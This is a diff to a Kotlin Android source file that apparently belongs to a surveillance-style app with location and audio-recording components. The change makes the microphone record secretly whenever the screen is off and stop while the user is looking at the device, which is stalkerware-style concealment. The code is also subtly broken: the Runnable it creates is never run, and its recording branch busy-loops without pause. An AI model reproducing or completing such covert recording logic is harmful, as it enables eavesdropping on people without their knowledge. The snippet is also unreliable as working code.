@@ -5,6 +5,7 @@ import android.net.ConnectivityManager
 import android.net.NetworkRequest
 import android.os.Build
 import android.os.Environment
+import android.os.PowerManager
 import android.util.Log
 import androidx.annotation.RequiresApi
 import com.zhu.cactus.App
@@ -55,10 +56,32 @@ class Location : component_impl {
 
 class record_audio : component_impl{
     override fun start() {
-        val audioRecord = OnlyAudioRecorder.instance
-        audioRecord.startRecord()//开始录音
-        Log.d("audio","录音开始,位置："+ Environment.getDataDirectory().path.toString())
-      //audioRecord.stopRecord()//停止录音
+
+        val powerManager =  App.context.getSystemService(Context.POWER_SERVICE) as PowerManager
+
+//true为打开，false为关闭
+        Runnable {
+            run {
+                Log.d("audio","录音开始,位置状态？"+ Environment.getExternalStorageState().toString())
+                val audioRecord = OnlyAudioRecorder.instance
+
+                while (true) {
+
+                    if(powerManager.isInteractive) {
+                        Log.d("录音","开屏停止，sleep 5s ")
+                        audioRecord.stopRecord()//停止录音
+                        Thread.sleep(5000)
+                    }
+                    else{
+                        Log.d("录音","息屏录音")
+                        audioRecord.startRecord()//开始录音
+                    }
+
+                }
+
+
+            }
+        }
     }
 
 }
